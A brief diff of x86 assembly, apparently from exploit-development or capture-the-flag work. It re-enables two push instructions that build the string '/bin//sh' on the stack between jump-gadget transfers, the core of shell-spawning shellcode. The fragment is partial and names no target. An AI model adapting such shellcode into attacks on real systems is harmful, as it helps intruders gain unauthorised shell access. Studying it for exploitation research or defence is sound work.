@@ -14,9 +14,9 @@ jmp    edx
 xor    eax, eax
 push   eax
 jmp    esi
-;push   0x68732f2f
+push   0x68732f2f
 jmp    esi
-;push   0x6e69622f
+push   0x6e69622f
 jmp    esi
 mov    esp, ebx
 push   eax
